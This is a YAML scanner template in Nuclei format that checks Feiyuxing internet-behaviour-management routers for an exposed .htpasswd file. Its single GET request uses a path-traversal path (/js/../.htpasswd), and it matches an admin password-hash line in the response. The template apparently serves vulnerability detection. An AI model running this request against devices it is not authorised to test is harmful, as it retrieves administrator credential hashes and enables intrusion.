id: poc-yaml-feiyuxing-htpasswd-info-leak
info:
  name: 飞鱼星上网行为管理路由器 .htpasswd 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露
  description: |
    This template checks for the presence of a .htpasswd file in the 飞鱼星上网行为管理路由器, which may indicate an information disclosure vulnerability.
http:
  - method: GET
    path:
      - "{{BaseURL}}/js/../.htpasswd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - '^admin:\\$1\\$.*$'
        part: body
      - type: word
        part: body
        words:
          - "<"
        negative: true
